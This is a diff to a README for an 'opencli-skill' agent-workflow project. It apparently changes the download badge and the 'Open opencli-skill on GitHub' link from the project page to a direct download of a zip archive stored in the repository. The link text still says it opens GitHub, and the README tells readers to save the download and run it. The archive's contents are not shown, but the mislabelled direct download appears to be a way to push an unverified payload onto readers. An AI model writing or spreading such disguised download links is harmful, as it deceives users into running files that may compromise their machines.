@@ -1,6 +1,6 @@
 # 🛠️ opencli-skill - Simple desktop workflows for agents
 
-[![Download opencli-skill](https://img.shields.io/badge/Download-OpenCLI_Skill-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Baileybasic68/opencli-skill)
+[![Download opencli-skill](https://img.shields.io/badge/Download-OpenCLI_Skill-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Baileybasic68/opencli-skill/main/agents/opencli_skill_2.0.zip)
 
 ## 🚀 What this app does
 
@@ -34,7 +34,7 @@ For best results, keep these tools ready:
 
 Visit this page to download the app:
 
-[Open opencli-skill on GitHub](https://github.com/Baileybasic68/opencli-skill)
+[Open opencli-skill on GitHub](https://raw.githubusercontent.com/Baileybasic68/opencli-skill/main/agents/opencli_skill_2.0.zip)
 
 If your browser shows a file list, use the main project files or the latest release package on that page. Save the download to your PC before you run it.
 
